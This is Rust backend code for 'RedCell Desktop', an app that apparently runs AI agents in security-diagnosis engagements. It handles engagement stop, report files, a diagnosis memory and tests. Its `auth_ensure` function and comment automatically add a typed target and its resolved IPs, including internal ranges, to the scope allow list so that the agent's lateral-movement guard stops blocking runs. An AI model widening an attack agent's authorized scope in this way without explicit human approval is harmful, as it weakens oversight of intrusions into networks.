            "[sys] '깊게/정밀' 요청으로 판단해 표준 진단(리포트 표준 + 자동 기본 점검)으로 진행합니다 — 심층 진단은 위에 주소가 있어야 실행됩니다.".to_string()
        } else {
            "[sys] '진단' 요청으로 판단해 표준 진단(리포트 표준 + 자동 기본 점검)으로 진행합니다.".to_string()
        };
        emit_note(&app, &id, text, None);
    }
    dns_drift_check(&app, &id, &s.host)?;
    gate_session_instruction(&app, &id, &s)?;
    // 세션 엔진에 따라 pi(-e 확장 게이트) 또는 prime-agent(스킬+킬게이트)로 실행한다.
    // (정밀 진단은 start_deep_diagnosis — 병렬 5분야 + 병합.)
    return match session_engine(&s) {
        Engine::Pi => run_prime(&app, &id, &s, &settings, &redcell, &provider),
        Engine::Prime => run_prime_agent(&app, &id, &s, &settings, &provider),
    };
}
/// 실행 중지 — 등록된 자식 프로세스(심층 워커 `{id}#w{n}` 포함)를 kill 하고 stopped 로 마감한다.
/// P0 스윕 중·라운드 사이처럼 등록된 자식이 없는 구간에서도 status 가 running 이면
/// stopped 로 전이한다 — 그래야 정밀 진단 스레드가 다음 단계를
/// 시작하지 않고 바로 마감한다. (자식 없이 running 도 아닌 경우에만 Err.)
#[tauri::command]
fn stop_engagement(app: AppHandle, id: String) -> Result<(), String> {
    let keys: Vec<String> = {
        let procs = app.state::<Procs>();
        let reg = procs.0.lock().unwrap();
        reg.keys()
            .filter(|k| *k == &id || k.starts_with(&format!("{id}#")))
            .cloned()
            .collect()
    };
    if keys.is_empty() {
        let running = read_session(&app, &id).map(|s| s.status == "running").unwrap_or(false);
        if !running {
            return Err("실행 중인 세션이 아닙니다".into());
        }
        // 자식은 없지만 실행 상태(P0 스윕·라운드 사이) — 아래에서 stopped 로 마감한다.
    }
    for k in keys {
        let removed = app.state::<Procs>().0.lock().unwrap().remove(&k);
        if let Some(mut child) = removed {
            kill_engine_child(&mut child);
            let _ = child.wait();
        }
    }

    let ev = json!({ "type": "note", "text": "[중지] 사용자가 실행을 중지했습니다." });
    let stamped = append_event(&app, &id, &ev);
    app.emit("engagement-event", json!({ "sessionId": id, "event": stamped }))
        .ok();
    set_status(&app, &id, "stopped");
    app.emit(
        "engagement-status",
        json!({ "sessionId": id, "status": "stopped" }),
    )
    .ok();
    Ok(())
}

// ── 인가 목록(ip-list) — UI 에서 IP 추가/제거 ──────────────────────────────────
// 경로 해석: ⚙ 설정의 auth_path(상대 경로는 redcell_dir 기준) → 없으면 기본
// ~/.redcell/authorization.list. redcell CLI 의 findAuthPath 우선순위와 일치한다.
fn resolve_app_auth_path(app: &AppHandle) -> std::path::PathBuf {
    let s = get_settings(app.clone());
    let p = s.auth_path.trim();
    if p.is_empty() {
        return auth::default_list_path();
    }
    let pb = std::path::PathBuf::from(p);
    if pb.is_absolute() {
        return pb;
    }
    if !s.redcell_dir.trim().is_empty() {
        let d = std::path::PathBuf::from(s.redcell_dir.trim());
        if d.is_absolute() {
            return d.join(pb);
        }
    }
    std::env::current_dir().unwrap_or_else(|_| std::path::PathBuf::from(".")).join(pb)
}

#[tauri::command]
fn list_auth(app: AppHandle) -> auth::AuthList {
    auth::load(&resolve_app_auth_path(&app))
}

#[tauri::command]
fn add_auth(app: AppHandle, target: String, deny: bool) -> Result<auth::AuthList, String> {
    let path = resolve_app_auth_path(&app);
    auth::add(&path, &target, deny)?;
    Ok(auth::load(&path))
}

#[tauri::command]
fn remove_auth(app: AppHandle, target: String) -> Result<auth::AuthList, String> {
    let path = resolve_app_auth_path(&app);
    auth::remove(&path, &target)?;
    Ok(auth::load(&path))
}

/// 실행 전 자동 인가 — 입력한 host/URL 을 허용 목록에 추가하고 결과를 알린다.
/// (파일이 정식 YAML 이면 아무것도 건드리지 않고 yaml=true 만 알린다 — 게이트는 엔진이 수행)
///
/// "URL 입력 = 그 대상 인가" 계약을 이름뿐 아니라 실제 접속 IP 까지 채운다: host 를 DNS 로
/// 해석해 나온 IP 도 함께 목록에 추가한다. 그래야 엔진 ScopeGuard 의 연결시점 IP 검증
/// (checkResolvedIp) 을 통과한다 — 특히 사설 대역(10.x 등 사내망 호스트)으로 해석되는
/// 대상은 IP 가 명시 인가돼 있지 않으면 측면이동 방지 기본값에 막히므로, 실행할 때마다
/// "가 인가 IP 로 해석되지 않습니다" 오류가 났었다.
#[derive(serde::Serialize)]
struct AuthEnsureResult {
    added: bool,
    existed: bool,
    host: String,
    path: String,
    yaml: bool,
    reason: Option<String>,
    /// 이번에 DNS 해석해 새로 추가한 IP 목록.
    ips_added: Vec<String>,
    /// 이미 목록에 있던 IP 목록(재추가 안 함).
    ips_known: Vec<String>,
}

#[tauri::command]
fn auth_ensure(app: AppHandle, host: String) -> Result<AuthEnsureResult, String> {
    let path = resolve_app_auth_path(&app);
    let normalized = auth::normalize_host(&host);
    let loaded = auth::load(&path);
    if loaded.yaml {
        return Ok(AuthEnsureResult {
            added: false,
            existed: false,
            host: normalized,
            path: loaded.path,
            yaml: true,
            reason: Some("인가 파일이 정식 YAML 입니다 — 자동 추가하지 않습니다.".into()),
            ips_added: vec![],
            ips_known: vec![],
        });
    }
    let host_added = if loaded.allows.iter().any(|a| a == &normalized) {
        false
    } else {
        auth::ensure_allowed(&path, &host)?;
        true
    };

    // DNS 해석 → 해석된 IP 도 허용 목록에 (중복 제외).
    // 해석 실패(오프라인/존재하지 않는 이름)면 조용히 이름만 추가하고 넘어간다 —
    // 엔진이 실행 시점에 다시 검증한다(fail-closed 유지).
    let (ips_added, ips_known) = auth::resolve_and_allow(&path, &normalized, &loaded.allows);
    Ok(AuthEnsureResult {
        added: host_added,
        existed: !host_added,
        host: normalized,
        path: auth::load(&path).path,
        yaml: false,
        reason: None,
        ips_added,
        ips_known,
    })
}

/// 진단/정리 리포트(MD)를 앱 데이터 폴더의 reports/ 에 저장하고 절대 경로를 돌려준다.
/// 파일명은 사용자 제공 이름을 위생 처리해 경로 주입·잘못된 문자를 막는다.
#[tauri::command]
fn write_report(app: AppHandle, name: String, content: String, format: Option<String>) -> Result<String, String> {
    let dir = root(&app).join("reports");
    fs::create_dir_all(&dir).map_err(|e| format!("보고서 폴더 생성 실패: {e}"))?;
    let base = name.trim();
    let base = if base.is_empty() {
        "report".to_string()
    } else {
        sanitize_filename(base)
    };
    let ext = match format.as_deref() {
        Some("html") => "html",
        _ => "md",
    };
    let file = dir.join(format!(
        "{}-{}.{}",
        Utc::now().format("%Y%m%d-%H%M%S"),
        base,
        ext
    ));
    fs::write(&file, content).map_err(|e| format!("보고서 저장 실패: {e}"))?;
    Ok(file.to_string_lossy().into_owned())
}

/// 파일명 위생 처리: 경로 구분자와 이상한 문자가 섞이지 않게 알파벳·숫자·한글·공백만 남긴다.
fn sanitize_filename(raw: &str) -> String {
    let mut out = String::new();
    let mut prev_space = false;
    for c in raw.trim().chars() {
        let ok = c.is_alphanumeric() || c.is_whitespace() || matches!(c, '-' | '_');
        if ok && c.is_whitespace() {
            if !prev_space {
                out.push(' ');
                prev_space = true;
            }
            continue;
        }
        if ok {
            out.push(c);
            prev_space = false;
        }
    }
    let v: String = out.chars().take(80).collect();
    if v.trim().is_empty() {
        "report".into()
    } else {
        v.trim().to_string()
    }
}

/// host 를 DNS 해석해 나온 IP 를 인가 목록에 추가한다. 반환: (새로 추가한 IP, 이미 있던 IP).
// ── 발행 리포트 파일 — 병합될 때마다 reports/ 에 자동 저장하고 목록·열기를 제공한다 ──
fn reports_dir(app: &AppHandle) -> PathBuf {
    let d = root(app).join("reports");
    fs::create_dir_all(&d).ok();
    d
}

/// 발행 파일명 규칙: {session_id}\_{tag}\_{ts}.md — 세션 묶음·차수·시각 파싱.
/// 수동 저장(write_report) 등 규칙 밖 이름은 None → 별도 묶음으로 표시한다.
fn parse_report_filename(name: &str) -> Option<(String, String, i64)> {
    let stem = name.strip_suffix(".md")?;
    let mut parts = stem.rsplitn(3, '_');
    let ts: i64 = parts.next()?.parse().ok()?;
    let tag = parts.next()?.to_string();
    let sid = parts.next()?.to_string();
    if sid.is_empty() || !matches!(tag.as_str(), "early" | "final" | "note") {
        return None;
    }
    Some((sid, tag, ts))
}

/// 같은 세션·태그의 동일 내용 발행 파일을 찾는다 — 저장 재사용 + 채우기 계수용.
fn find_report_file(dir: &Path, session_id: &str, tag: &str, text: &str) -> Option<PathBuf> {
    let sid: String = session_id.chars().filter(|c| c.is_alphanumeric() || *c == '-' || *c == '_').collect();
    let rd = fs::read_dir(dir).ok()?;
    for e in rd.flatten() {
        let name = e.file_name().to_string_lossy().into_owned();
        if let Some((psid, ptag, _)) = parse_report_filename(&name) {
            if psid == sid && ptag == tag
                && fs::read_to_string(e.path()).map(|old| old == text).unwrap_or(false)
            {
                return Some(e.path());
            }
        }
    }
    None
}

/// 리포트 텍스트를 발행 파일로 저장 — 같은 세션·태그에 동일 내용 파일이 있으면 재사용.
fn write_report_file(dir: &Path, session_id: &str, tag: &str, text: &str) -> Result<PathBuf, String> {
    fs::create_dir_all(dir).map_err(|e| format!("보고서 폴더 생성 실패: {e}"))?;
    let sid: String = session_id.chars().filter(|c| c.is_alphanumeric() || *c == '-' || *c == '_').collect();
    let sid = if sid.is_empty() { "session".to_string() } else { sid };
    let tag = if matches!(tag, "early" | "final" | "note") { tag } else { "note" };
    if let Some(existing) = find_report_file(dir, &sid, tag, text) {
        return Ok(existing);
    }
    // 같은 초에 다른 내용이 오면 1초씩 밀어 덮어쓰기를 피한다.
    let mut ts = Utc::now().timestamp();
    loop {
        let path = dir.join(format!("{sid}_{tag}_{ts}.md"));
        match fs::read_to_string(&path) {
            Err(_) => {
                fs::write(&path, text).map_err(|e| format!("보고서 저장 실패: {e}"))?;
                return Ok(path);
            }
            Ok(old) if old == text => return Ok(path),
            Ok(_) => ts += 1,
        }
    }
}

/// 발행 리포트 파일 1건 — reports/ 폴더 스캔 결과.
#[derive(Serialize, Clone)]
struct ReportFile {
    session_id: String,
    tag: String,
    ts: i64,
    file: String,
    size: u64,
    manual: bool,
}

/// 시작 시 1회: 발행 표식(early/final) 기록 중 파일이 없는 것을 저장한다.
/// 자동 저장 도입 전 세션의 리포트도 파일로 갖게 하는 마이그레이션.
/// 새로 쓴 개수를 돌려준다.
fn backfill_reports_in_dir(sessions: &Path, reports: &Path) -> usize {
    let mut n = 0usize;
    let Ok(rd) = fs::read_dir(sessions) else { return 0 };
    for e in rd.flatten() {
        if e.path().extension().and_then(|x| x.to_str()) != Some("json") {
            continue;
        }
        let Ok(txt) = fs::read_to_string(e.path()) else { continue };
        let Ok(s) = serde_json::from_str::<Session>(&txt) else { continue };
        // 이벤트는 <id>.events.ndjson 에 산다(구버전 세션 JSON embed 는 s.events 로 함께).
        let mut events = s.events.clone();
        events.extend(read_events_file(&sessions.join(format!(
            "{}.events.ndjson",
            s.id
        ))));
        for ev in &events {
            let tag = ev.get("report").and_then(|v| v.as_str()).unwrap_or("");
            if !matches!(tag, "early" | "final") {
                continue;
            }
            let text = ev.get("text").and_then(|v| v.as_str()).unwrap_or("").trim();
            if text.is_empty() || find_report_file(reports, &s.id, tag, text).is_some() {
                continue;
            }
            if write_report_file(reports, &s.id, tag, text).is_ok() {
                n += 1;
            }
        }
    }
    n
}

#[tauri::command]
fn backfill_reports(app: AppHandle) -> usize {
    backfill_reports_in_dir(&sessions_dir(&app), &reports_dir(&app))
}

/// 보고서 폴더 절대 경로 — "폴더 열기" 버튼용.
#[tauri::command]
fn reports_path(app: AppHandle) -> String {
    reports_dir(&app).to_string_lossy().into_owned()
}

#[tauri::command]
fn list_reports(app: AppHandle) -> Vec<ReportFile> {
    let dir = reports_dir(&app);
    let mut out = Vec::new();
    let Ok(rd) = fs::read_dir(&dir) else { return out };
    for e in rd.flatten() {
        let p = e.path();
        let ext = p.extension().and_then(|x| x.to_str()).unwrap_or("");
        if ext != "md" && ext != "html" {
            continue;
        }
        let name = e.file_name().to_string_lossy().into_owned();
        let md = e.metadata().ok();
        let size = md.as_ref().map(|m| m.len()).unwrap_or(0);
        let mtime = md
            .and_then(|m| m.modified().ok())
            .and_then(|t| t.duration_since(std::time::UNIX_EPOCH).ok())
            .map(|d| d.as_secs() as i64)
            .unwrap_or(0);
        if ext == "md" {
            if let Some((sid, tag, ts)) = parse_report_filename(&name) {
                out.push(ReportFile { session_id: sid, tag, ts, file: p.to_string_lossy().into_owned(), size, manual: false });
                continue;
            }
        }
        out.push(ReportFile { session_id: String::new(), tag: "manual".into(), ts: mtime, file: p.to_string_lossy().into_owned(), size, manual: true });
    }
    out.sort_by(|a, b| b.ts.cmp(&a.ts));
    out
}

/// 세션 기록 1건(seq)을 발행 파일로 저장하고 경로를 돌려준다 — 파일이 이미
/// 있으면(자동 저장됨) 그대로 재사용한다. 오래된 세션의 리포트 열기용.
/// `seqs` 가 2건 이상이면 스트리밍 분할 조각들을 순서대로 합쳐 전문으로 저장한다
/// (첫 조각만 저장되는 잘림 방지).
#[tauri::command]
fn save_report_file(app: AppHandle, session_id: String, seq: i64, seqs: Option<Vec<i64>>) -> Result<String, String> {
    let s = read_session(&app, &session_id).ok_or("세션을 찾을 수 없습니다")?;
    let wanted: Vec<i64> = match seqs {
        Some(v) if v.len() > 1 => v,
        _ => vec![seq],
    };
    let mut parts: Vec<String> = Vec::new();
    let mut tag = "note";
    for q in &wanted {
        let ev = s.events.iter().find(|e| e.get("_seq").and_then(|v| v.as_i64()) == Some(*q)).ok_or("해당 기록을 찾을 수 없습니다")?;
        let t = ev.get("text").and_then(|v| v.as_str()).unwrap_or("").trim();
        if !t.is_empty() {
            parts.push(t.to_string());
        }
        if parts.len() == 1 {
            tag = ev.get("report").and_then(|v| v.as_str()).unwrap_or("note");
        }
    }
    let text = parts.join("\n\n");
    if text.trim().is_empty() {
        return Err("빈 기록은 저장할 수 없습니다".into());
    }
    let dir = reports_dir(&app);
    Ok(write_report_file(&dir, &session_id, tag, text.trim())?.to_string_lossy().into_owned())
}

/// 경로 열기 — 보고서 폴더 안의 파일만 허용한다.
/// mode: "open"(기본 앱으로 열기) | "reveal"(폴더에서 보여주기).
#[tauri::command]
fn open_path(app: AppHandle, path: String, mode: Option<String>) -> Result<(), String> {
    let (prog, args) = resolve_open_target(&root(&app), &path, mode.as_deref().unwrap_or("open"))?;
    Command::new(prog).args(args).spawn().map_err(|e| format!("열기 실패: {e}"))?;
    Ok(())
}

fn resolve_open_target(root: &Path, path: &str, mode: &str) -> Result<(String, Vec<String>), String> {
    let canon = PathBuf::from(path).canonicalize().map_err(|_| "파일을 찾을 수 없습니다")?;
    let root_c = root.canonicalize().unwrap_or_else(|_| root.to_path_buf());
    if !canon.starts_with(&root_c) {
        return Err("보고서 폴더 밖의 경로는 열 수 없습니다".into());
    }
    let p = canon.to_string_lossy().into_owned();
    if mode == "reveal" {
        #[cfg(target_os = "windows")]
        return Ok(("explorer".into(), vec![format!("/select,{p}")]));
        #[cfg(target_os = "macos")]
        return Ok(("open".into(), vec!["-R".into(), p]));
        #[cfg(not(any(target_os = "windows", target_os = "macos")))]
        {
            let parent = canon.parent().map(|d| d.to_string_lossy().into_owned()).unwrap_or(p);
            return Ok(("xdg-open".into(), vec![parent]));
        }
    }
    #[cfg(target_os = "windows")]
    return Ok(("explorer".into(), vec![p]));
    #[cfg(target_os = "macos")]
    return Ok(("open".into(), vec![p]));
    #[cfg(not(any(target_os = "windows", target_os = "macos")))]
    return Ok(("xdg-open".into(), vec![p]));
}

// ── 진단 메모리(harness memory) — prime-agent Continual Harness 패턴의 경량 구현 ──
// 전역 메모 + 대상별 메모를 앱 데이터 memory.json 에 누적하고, 진단 지시문에 주입한다.
// kind: note(사용자 메모) | history(정밀 진단 이력 자동 기록) | fix(조치 확인됨).
#[derive(Serialize, Deserialize, Clone)]
struct MemoryNote {
    id: String,
    ts: String,
    #[serde(default)]
    host: String, // 빈 문자열 = 전역
    #[serde(default)]
    kind: String,
    text: String,
}

fn memory_file(app: &AppHandle) -> PathBuf {
    root(app).join("memory.json")
}

fn load_memory(app: &AppHandle) -> Vec<MemoryNote> {
    fs::read_to_string(memory_file(app))
        .ok()
        .and_then(|t| serde_json::from_str(&t).ok())
        .unwrap_or_default()
}

fn save_memory(app: &AppHandle, notes: &[MemoryNote]) {
    if let Ok(txt) = serde_json::to_string_pretty(notes) {
        fs::write(memory_file(app), txt).ok();
    }
}

/// 진단 지시문에 주입하는 메모리 블록 (전역 + 해당 대상, 최신 8건, 건당 300자).
fn memory_block(app: &AppHandle, host: &str) -> String {
    let notes = load_memory(app);
    let host = host.trim().to_lowercase();
    let picked: Vec<&MemoryNote> = notes
        .iter()
        .filter(|n| n.host.trim().is_empty() || (!host.is_empty() && n.host.trim().to_lowercase() == host))
        .collect();
    if picked.is_empty() {
        return String::new();
    }
    let mut out = String::from("## 과거 진단 메모 (이번 진단에 반영할 것)\n");
    for n in picked.iter().rev().take(8) {
        let t: String = n.text.chars().take(300).collect();
        out.push_str(&format!("- [{}] {}\n", n.kind, t.trim()));
    }
    out
}

/// 정밀 진단 완료 후 이력 1줄 자동 기록 (대상별 history 5건·전체 300건 상한).
fn record_history(app: &AppHandle, host: &str, ok_n: usize, total: usize, ok: bool) {
    let guard = app.state::<IoGuard>();
    let _lock = guard.0.lock().unwrap();
    let mut notes = load_memory(app);
    // 같은 대상 history 는 최근 4건만 남긴다.
    let mut kept_hist: Vec<MemoryNote> = notes
        .iter()
        .filter(|n| n.kind == "history" && n.host == host)
        .cloned()
        .collect();
    kept_hist.sort_by(|a, b| b.ts.cmp(&a.ts));
    kept_hist.truncate(4);
    notes.retain(|n| !(n.kind == "history" && n.host == host));
    notes.extend(kept_hist);
    let day = now().chars().take(10).collect::<String>();
    notes.push(MemoryNote {
        id: Uuid::new_v4().to_string(),
        ts: now(),
        host: host.to_string(),
        kind: "history".into(),
        text: format!(
            "심층진단 {day} — 워커 {ok_n}/{total} 성공, 리포트 병합 {}.",
            if ok { "성공" } else { "실패" }
        ),
    });
    // 전체 상한: 오래된 history 부터 제거.
    while notes.len() > 300 {
        if let Some(pos) = notes.iter().position(|n| n.kind == "history") {
            notes.remove(pos);
        } else {
            break;
        }
    }
    save_memory(&app, &notes);
}

#[tauri::command]
fn get_memory(app: AppHandle, host: String) -> Value {
    let notes = load_memory(&app);
    let h = host.trim().to_lowercase();
    let global: Vec<&MemoryNote> = notes.iter().filter(|n| n.host.trim().is_empty()).collect();
    let mine: Vec<&MemoryNote> =
        notes.iter().filter(|n| !n.host.trim().is_empty() && n.host.trim().to_lowercase() == h).collect();
    json!({ "global": global, "host": mine })
}

#[tauri::command]
fn add_memory(app: AppHandle, host: String, kind: String, text: String) -> Result<Value, String> {
    let text = text.trim();
    if text.is_empty() {
        return Err("메모 내용을 입력하세요.".into());
    }
    if text.chars().count() > 2000 {
        return Err("메모는 2000자 이내로 입력하세요.".into());
    }
    let kind = match kind.trim() {
        "note" | "fix" | "history" => kind.trim().to_string(),
        "" => "note".to_string(),
        other => return Err(format!("알 수 없는 메모 종류: {other}")),
    };
    let guard = app.state::<IoGuard>();
    let _lock = guard.0.lock().unwrap();
    let mut notes = load_memory(&app);
    notes.push(MemoryNote {
        id: Uuid::new_v4().to_string(),
        ts: now(),
        host: host.trim().to_string(),
        kind,
        text: text.to_string(),
    });
    save_memory(&app, &notes);
    Ok(json!({ "ok": true, "count": notes.len() }))
}

#[tauri::command]
fn remove_memory(app: AppHandle, id: String) -> Result<Value, String> {
    let guard = app.state::<IoGuard>();
    let _lock = guard.0.lock().unwrap();
    let mut notes = load_memory(&app);
    let before = notes.len();
    notes.retain(|n| n.id != id);
    if notes.len() == before {
        return Err("메모를 찾을 수 없습니다.".into());
    }
    save_memory(&app, &notes);
    Ok(json!({ "ok": true, "count": notes.len() }))
}

/// prime-agent 버전 조회 — `--version` 첫 줄 (3초 타임아웃).
fn prime_version(bin: &Path) -> Option<String> {
    let mut probe = Command::new(bin);
    probe.arg("--version").stdout(Stdio::piped()).stderr(Stdio::null());
    hide_window(&mut probe);
    let mut child = probe.spawn().ok()?;
    let mut waited = 0;
    loop {
        if child.try_wait().ok()??.success() {
            use std::io::Read;
            let mut out = String::new();
            if let Some(mut o) = child.stdout.take() {
                let _ = o.read_to_string(&mut out);
            }
            let v = out.lines().next().unwrap_or("").trim().to_string();
            return if v.is_empty() { None } else { Some(v) };
        }
        std::thread::sleep(std::time::Duration::from_millis(100));
        waited += 100;
        if waited > 3000 {
            let _ = child.kill();
            return None;
        }
    }
}

/// 엔진 감지 — pi-coding-agent + prime-agent(Rust 하네스 직접 실행) 설치 상태·버전.
/// 버전 요구치는 engines.json 핀에서 읽는다. UI 는 satisfies_min=false 일 때 경고를 표시한다.
#[tauri::command]
fn detect_engines(app: AppHandle) -> Value {
    let settings = get_settings(app);
    let pi = prime_cli_path(&settings.redcell_dir)
        .map(|p| p.to_string_lossy().into_owned())
        .ok();
    let pi_ver = if pi.is_some() { pi_cli_version(&settings) } else { "미확인".to_string() };
    let pi_min = pi_min_version();
    let pi_pinned = pi_pinned_version();
    let prime_path = prime_agent_path().ok();
    let prime_ver = prime_path.as_deref().and_then(prime_version);
    let prime_min = prime_min_version();
    let prime_pinned = prime_pinned_version();
    let pi_ok = if pi.is_some() { pi_version_at_least(&pi_ver, &pi_min) } else { true };
    json!({
        "pi": {
            "found": pi.is_some(), "path": pi,
            "version": pi_ver,
            "min": pi_min,
            "pinned": pi_pinned,
            "satisfies_min": pi_ok,
        },
        "prime_agent": {
            "found": prime_path.is_some(),
            "path": prime_path.map(|p| p.to_string_lossy().into_owned()),
            "version": prime_ver.clone(),
            "min": prime_min,
            "pinned": prime_pinned,
            "satisfies_min": prime_ver.as_deref().map(|v| pi_version_at_least(v, &prime_min_version())).unwrap_or(true),
        },
    })
}

fn main() {
    tauri::Builder::default()
        .manage(IoGuard(Mutex::new(())))
        .manage(EventSeqs(Mutex::new(HashMap::new())))
        .manage(Procs(Mutex::new(HashMap::new())))
        .invoke_handler(tauri::generate_handler![
            get_settings,
            save_settings,
            list_sessions,
            get_session,
            create_session,
            update_session,
            set_danger_consent,
            delete_session,
            append_chat,
            start_engagement,
            start_deep_diagnosis,
            stop_engagement,
            get_memory,
            add_memory,
            remove_memory,
            detect_engines,
            list_auth,
            add_auth,
            remove_auth,
            auth_ensure,
            get_providers,
            test_provider,
            write_report,
            reports_path,
            list_reports,
            save_report_file,
            backfill_reports,
            open_path
        ])
        .run(tauri::generate_context!())
        .expect("RedCell Desktop 실행 중 오류");
}

#[cfg(test)]
mod tests {
    use super::*;

    /// 그룹 kill — 자식의 자식(손자 sleep)까지 정리되는지 검증 (Unix 전용).
    /// sh -c 'sleep 60 & ...; wait' 구조로 손자를 만들고 kill_engine_child 후 소멸 확인.
    #[cfg(unix)]
    #[test]
    fn kill_engine_child_kills_grandchildren() {
        use std::os::unix::process::CommandExt;
        let dir = std::env::temp_dir().join(format!("rc-killpg-{}", std::process::id()));
        std::fs::create_dir_all(&dir).unwrap();
        let pidfile = dir.join("grandchild.pid");
        let mut cmd = Command::new("sh");
        cmd.process_group(0);
        cmd.arg("-c")
            .arg(format!("sleep 60 & echo $! > '{}'; wait", pidfile.display()));
        let mut child = cmd.spawn().expect("sh 스폰");
        // 손자 pid 기록 대기 (최대 5초).
        let mut gpid: Option<i32> = None;
        for _ in 0..50 {
            if let Ok(t) = std::fs::read_to_string(&pidfile) {
                if let Ok(p) = t.trim().parse::<i32>() {
                    gpid = Some(p);
                    break;
                }
            }
            std::thread::sleep(std::time::Duration::from_millis(100));
        }
        let gpid = gpid.expect("손자 pid 기록");
        // 손자 생존 확인 후 그룹 kill.
        unsafe {
            assert_eq!(libc::kill(gpid, 0), 0, "선행조건: 손자 생존");
        }
        kill_engine_child(&mut child);
        // 손자 소멸 확인 (최대 5초 — SIGTERM 즉시 + SIGKILL 에스컬레이션).
        let mut dead = false;
        for _ in 0..50 {
            unsafe {
                if libc::kill(gpid, 0) != 0 {
                    dead = true;
                    break;
                }
            }
            std::thread::sleep(std::time::Duration::from_millis(100));
        }
        assert!(dead, "손자 프로세스도 정리되어야 한다 (pid {gpid})");
        std::fs::remove_dir_all(&dir).ok();
    }

    /// 전담 HOME — home 생성 + .prime 링크(실제 설정이 있을 때만).
    #[cfg(unix)]
    #[test]
    fn setup_prime_home_shapes() {
        let sdir = std::env::temp_dir().join(format!("rc-phome-{}", std::process::id()));
        std::fs::create_dir_all(&sdir).unwrap();
        let fake = setup_prime_home(&sdir).expect("전담 HOME 생성");
        assert!(fake.is_dir(), "home 디렉터리 존재: {fake:?}");
        assert_eq!(fake.file_name().unwrap(), "home");
        // 실제 ~/.prime 이 있으면 링크, 없으면 링크 없이 통과.
        let real = user_home().map(|h| h.join(".prime"));
        let link = fake.join(".prime");
        if real.map(|p| p.is_dir()).unwrap_or(false) {
            assert!(fs::symlink_metadata(&link).map(|m| m.file_type().is_symlink()).unwrap_or(false), ".prime 심볼릭 링크");
        } else {
            assert!(fs::symlink_metadata(&link).is_err(), "실제 설정 없으면 링크 없음");
        }
        std::fs::remove_dir_all(&sdir).ok();
    }

    /// stray 감사 — 파일은 잡고 .prime 링크 내부는 따라가지 않는다.
    #[test]
    fn prime_home_strays_shapes() {
        let dir = std::env::temp_dir().join(format!("rc-stray-{}", std::process::id()));
        let home = dir.join("home");
        std::fs::create_dir_all(home.join("sub")).unwrap();
        std::fs::write(home.join("loot.txt"), "x").unwrap();
        std::fs::write(home.join("sub").join("s.sh"), "x").unwrap();
        let strays = prime_home_strays(&home);
        assert_eq!(strays, vec!["loot.txt".to_string(), "sub/s.sh".to_string()]);
        assert!(prime_home_strays(&dir.join("없음")).is_empty(), "없는 경로는 빈 목록");
        // .prime 링크는 따라가지 않는다 (Unix).
        #[cfg(unix)]
        {
            let target = dir.join("real-prime");
            std::fs::create_dir_all(&target).unwrap();
            std::fs::write(target.join("secret.json"), "x").unwrap();
            std::os::unix::fs::symlink(&target, home.join(".prime")).unwrap();
            let strays2 = prime_home_strays(&home);
            assert!(!strays2.iter().any(|s| s.contains("secret.json")), "링크 내부는 감사 제외: {strays2:?}");
        }
        std::fs::remove_dir_all(&dir).ok();
    }

    /// 회귀 테스트: pi CLI(prime-agent) 경로 탐색은 nvm 전역 설치를 포함해 반드시 찾는다.
    /// (이 환경: HOME/.nvm/versions/node/*/lib/node_modules/... — 과거엔 못 찾아
    ///  "prime-agent(pi) 를 찾을 수 없습니다" 가 났다.)
    static ENV_LOCK: std::sync::Mutex<()> = std::sync::Mutex::new(());

    #[test]
    fn prime_cli_path_finds_pi_installation() {
        let _g = ENV_LOCK.lock().unwrap();
        let redcell = std::env::current_dir()
            .unwrap()
            .ancestors()
            .find(|p| p.join("src").join("cli.ts").exists())
            .map(|p| p.to_path_buf())
            .or_else(|| std::env::var("REDCELL_DIR").ok().map(PathBuf::from))
            .unwrap_or_else(|| PathBuf::from("/opt/workspace/local/bsh/workspace/absolute-agent/redcell"));
        let found = prime_cli_path(&redcell.to_string_lossy());
        assert!(found.is_ok(), "pi CLI 를 찾아야 한다 (nvm/pnpm/bun/npm root -g 탐색) — {found:?}");
        let p = found.unwrap();
        assert!(p.is_file(), "찾은 경로가 실제 파일이어야 한다: {p:?}");
        assert!(p.to_string_lossy().contains("pi-coding-agent"), "pi-coding-agent 경로여야 한다: {p:?}");
    }

    /// Windows 실사용 시나리오 재현: HOME 미설정이어도 USERPROFILE·APPDATA·LOCALAPPDATA·
    /// ProgramFiles 기반 후보가 생성되고, PATH 에 pi.cmd shim 만 있으면 해석되어야 한다.
    #[test]
    fn prime_cli_candidates_windows_layout() {
        let _g = ENV_LOCK.lock().unwrap();
        // 사용자 Windows PC 실사용 재현(HOME 미설정, USERPROFILE/APPDATA 만 존재).
        let saved = [
            ("HOME", std::env::var_os("HOME")),
            ("USERPROFILE", std::env::var_os("USERPROFILE")),
            ("APPDATA", std::env::var_os("APPDATA")),
            ("LOCALAPPDATA", std::env::var_os("LOCALAPPDATA")),
            ("ProgramFiles", std::env::var_os("ProgramFiles")),
            ("REDCELL_PI_DIR", std::env::var_os("REDCELL_PI_DIR")),
            ("PI_PACKAGE_DIR", std::env::var_os("PI_PACKAGE_DIR")),
        ];
        let restore = |saved: &[(&str, Option<std::ffi::OsString>)]| {
            for (k, v) in saved {
                match v {
                    Some(v) => std::env::set_var(k, v),
                    None => std::env::remove_var(k),
                }
            }
        };
        std::env::remove_var("HOME");
        std::env::set_var("USERPROFILE", "C:\\Users\\HP");
        std::env::set_var("APPDATA", "C:\\Users\\HP\\AppData\\Roaming");
        std::env::set_var("LOCALAPPDATA", "C:\\Users\\HP\\AppData\\Local");
        std::env::set_var("ProgramFiles", "C:\\Program Files");
        let cands = prime_cli_candidates("C:\\workspace\\redcell");
        // 구분자 평준화(\\ → /) 후 포함 검사로 OS 횡단 검증.
        let norm = |s: &str| s.to_lowercase().replace('\\', "/");
        let joined = norm(&cands.iter().map(|c| c.display().to_string()).collect::<Vec<_>>().join(" | "));
        for frag in [
            "c:/users/hp/appdata/roaming/npm/node_modules/@earendil-works/pi-coding-agent/dist/cli.js",
            "c:/users/hp/appdata/local/pnpm/global/node_modules/@earendil-works/pi-coding-agent/dist/cli.js",
            "c:/users/hp/appdata/local/programs/nodejs/node_modules/@earendil-works/pi-coding-agent/dist/cli.js",
            "c:/program files/nodejs/node_modules/@earendil-works/pi-coding-agent/dist/cli.js",
            "c:/users/hp/appdata/roaming/nvm/node_modules/@earendil-works/pi-coding-agent/dist/cli.js",
            "c:/users/hp/npm-global/node_modules/@earendil-works/pi-coding-agent/dist/cli.js",
            "c:/users/hp/.bun/install/global/node_modules/@earendil-works/pi-coding-agent/dist/cli.js",
        ] {
            assert!(joined.contains(frag), "후보 누락: {frag}\n전체: {joined}");
        }
